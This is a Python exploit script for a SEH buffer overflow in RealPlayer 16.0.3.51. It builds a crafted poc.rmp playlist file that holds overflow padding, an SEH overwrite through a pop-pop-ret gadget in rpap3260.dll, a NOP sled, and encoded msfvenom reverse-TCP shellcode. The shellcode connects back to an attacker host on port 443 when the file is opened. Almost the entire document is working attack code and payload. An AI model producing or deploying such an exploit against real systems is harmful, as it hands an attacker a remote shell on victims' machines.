#!/usr/bin/env python
# Written By: Eric Van Zutphen
# RealPlayer 16.0.3.51 SEH Overflow

import sys
from struct import pack

"""
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp EXITFUNC=seh -b '\x00' -f python LHOST=192.168.2.41 LPORT=443 -v shellcode -e x86/alpha_mixed
"""

shellcode =  ""
shellcode += "\x89\xe7\xd9\xc5\xd9\x77\xf4\x5e\x56\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x59\x6c\x58\x68\x4c\x42\x75\x50\x33\x30\x37\x70"
shellcode += "\x43\x50\x6b\x39\x59\x75\x54\x71\x59\x50\x45\x34"
shellcode += "\x4e\x6b\x62\x70\x30\x30\x4e\x6b\x52\x72\x56\x6c"
shellcode += "\x6c\x4b\x50\x52\x75\x44\x6e\x6b\x70\x72\x56\x48"
shellcode += "\x74\x4f\x6d\x67\x42\x6a\x64\x66\x65\x61\x39\x6f"
shellcode += "\x6e\x4c\x57\x4c\x73\x51\x43\x4c\x54\x42\x44\x6c"
shellcode += "\x31\x30\x49\x51\x38\x4f\x64\x4d\x75\x51\x69\x57"
shellcode += "\x6b\x52\x6b\x42\x32\x72\x71\x47\x6c\x4b\x36\x32"
shellcode += "\x72\x30\x4c\x4b\x33\x7a\x65\x6c\x4c\x4b\x30\x4c"
shellcode += "\x44\x51\x30\x78\x4d\x33\x33\x78\x55\x51\x58\x51"
shellcode += "\x72\x71\x6c\x4b\x30\x59\x57\x50\x45\x51\x78\x53"
shellcode += "\x6c\x4b\x53\x79\x44\x58\x6a\x43\x77\x4a\x47\x39"
shellcode += "\x4e\x6b\x57\x44\x6c\x4b\x65\x51\x69\x46\x74\x71"
shellcode += "\x49\x6f\x4c\x6c\x7a\x61\x6a\x6f\x64\x4d\x65\x51"
shellcode += "\x6f\x37\x30\x38\x6d\x30\x52\x55\x78\x76\x75\x53"
shellcode += "\x61\x6d\x4a\x58\x75\x6b\x43\x4d\x31\x34\x43\x45"
shellcode += "\x4a\x44\x71\x48\x4c\x4b\x31\x48\x37\x54\x37\x71"
shellcode += "\x4e\x33\x73\x56\x4e\x6b\x74\x4c\x30\x4b\x6c\x4b"
shellcode += "\x42\x78\x75\x4c\x53\x31\x38\x53\x6c\x4b\x44\x44"
shellcode += "\x4e\x6b\x35\x51\x6a\x70\x4f\x79\x43\x74\x67\x54"
shellcode += "\x34\x64\x33\x6b\x43\x6b\x31\x71\x62\x79\x72\x7a"
shellcode += "\x52\x71\x69\x6f\x59\x70\x31\x4f\x53\x6f\x32\x7a"
shellcode += "\x6e\x6b\x37\x62\x5a\x4b\x4c\x4d\x73\x6d\x52\x48"
shellcode += "\x30\x33\x50\x32\x75\x50\x57\x70\x72\x48\x72\x57"
shellcode += "\x51\x63\x65\x62\x71\x4f\x66\x34\x43\x58\x32\x6c"
shellcode += "\x33\x47\x44\x66\x63\x37\x59\x6f\x68\x55\x4e\x58"
shellcode += "\x6a\x30\x63\x31\x33\x30\x63\x30\x71\x39\x6f\x34"
shellcode += "\x71\x44\x56\x30\x71\x78\x54\x69\x4f\x70\x62\x4b"
shellcode += "\x65\x50\x79\x6f\x39\x45\x36\x30\x50\x50\x52\x70"
shellcode += "\x56\x30\x31\x50\x36\x30\x63\x70\x56\x30\x32\x48"
shellcode += "\x39\x7a\x44\x4f\x4b\x6f\x39\x70\x39\x6f\x49\x45"
shellcode += "\x6c\x57\x70\x6a\x47\x75\x53\x58\x79\x50\x6c\x68"
shellcode += "\x66\x62\x75\x79\x62\x48\x45\x52\x73\x30\x73\x31"
shellcode += "\x4d\x6b\x6f\x79\x59\x76\x50\x6a\x66\x70\x63\x66"
shellcode += "\x31\x47\x73\x58\x4c\x59\x59\x35\x54\x34\x73\x51"
shellcode += "\x4b\x4f\x4b\x65\x4b\x35\x6b\x70\x63\x44\x34\x4c"
shellcode += "\x69\x6f\x62\x6e\x43\x38\x63\x45\x58\x6c\x65\x38"
shellcode += "\x5a\x50\x6c\x75\x6c\x62\x73\x66\x79\x6f\x4a\x75"
shellcode += "\x45\x38\x55\x33\x42\x4d\x53\x54\x65\x50\x4f\x79"
shellcode += "\x4b\x53\x66\x37\x46\x37\x72\x77\x55\x61\x68\x76"
shellcode += "\x33\x5a\x42\x32\x42\x79\x66\x36\x68\x62\x59\x6d"
shellcode += "\x55\x36\x79\x57\x37\x34\x44\x64\x37\x4c\x53\x31"
shellcode += "\x75\x51\x6e\x6d\x52\x64\x61\x34\x36\x70\x6f\x36"
shellcode += "\x73\x30\x52\x64\x51\x44\x46\x30\x73\x66\x56\x36"
shellcode += "\x62\x76\x47\x36\x51\x46\x30\x4e\x50\x56\x33\x66"
shellcode += "\x53\x63\x46\x36\x52\x48\x42\x59\x68\x4c\x37\x4f"
shellcode += "\x6d\x56\x79\x6f\x6e\x35\x6f\x79\x39\x70\x50\x4e"
shellcode += "\x52\x76\x70\x46\x69\x6f\x30\x30\x43\x58\x76\x68"
shellcode += "\x6d\x57\x77\x6d\x61\x70\x4b\x4f\x4a\x75\x4d\x6b"
shellcode += "\x6b\x4e\x64\x4e\x75\x62\x4a\x4a\x53\x58\x6e\x46"
shellcode += "\x4f\x65\x6d\x6d\x4f\x6d\x59\x6f\x69\x45\x47\x4c"
shellcode += "\x65\x56\x63\x4c\x75\x5a\x4b\x30\x39\x6b\x49\x70"
shellcode += "\x44\x35\x33\x35\x4d\x6b\x51\x57\x77\x63\x42\x52"
shellcode += "\x42\x4f\x70\x6a\x37\x70\x70\x53\x79\x6f\x79\x45"
shellcode += "\x41\x41"




"""
0x6428878a : pop ecx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [rpap3260.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v16.0.3.51 (C:\Program Files\Real\RealPlayer\rpplugins\rpap3260.dll)
"""

def main():
	filename = "poc.rmp"

	buf = "\x41" * 13600
	buf += "\x76\x06\xFF\xFF"
	buf += pack("<L",0x6428878a)
	buf += "\x90" * 20
	buf += shellcode 
	buf += "D" * (25000- len(buf))
	
	f = open(filename, 'wb')
	f.write("<?xml version=\"" + buf + "\"?>")
	f.close()
	print "File created!"
	print "Payload size: " + str(len(buf))
	return


if __name__ == "__main__":
    main()
